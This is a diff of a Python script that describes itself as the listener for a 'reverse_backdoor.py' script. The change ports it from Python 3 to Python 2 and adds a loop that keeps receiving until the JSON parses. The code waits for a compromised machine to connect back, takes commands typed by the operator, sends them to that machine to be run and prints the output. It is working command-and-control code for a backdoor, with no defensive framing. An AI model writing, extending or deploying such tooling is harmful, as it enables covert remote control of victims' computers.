@@ -1,6 +1,6 @@
 #! /usr/bin/env python
 # NOTICE: This script is used as a listener for 'reverse_backdoor.py' script.
-# Compatibility: Python 3 only.
+# Compatibility: Python 2 only. For now.
 
 import json
 import socket
@@ -14,23 +14,28 @@ class Listener:
         listener_socket.listen(0)
         print("[+] Waiting for incoming connection...")
         self.connection, address = listener_socket.accept()
-        print(f"[+] Connection established! Source: {address}.")
+        print("[+] Connection established! Source: " + str(address))
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
-        self.connection.send(json_data.encode(errors="replace"))
+        self.connection.send(json_data)
 
     def reliable_receive(self):
-        json_data = self.connection.recv(1024).decode(errors="replace")
-        return json.loads(json_data)
+        json_data = ""
+        while True:
+            try:
+                json_data += self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
 
     def execute_remotely(self, command):
-        self.reliable_send(command.encode(errors="replace"))
+        self.reliable_send(command)
         return self.reliable_receive()
 
     def run(self):
         while True:
-            command = input(" >> ")
+            command = raw_input(" >> ")
             result = self.execute_remotely(command)
             print(result)
 
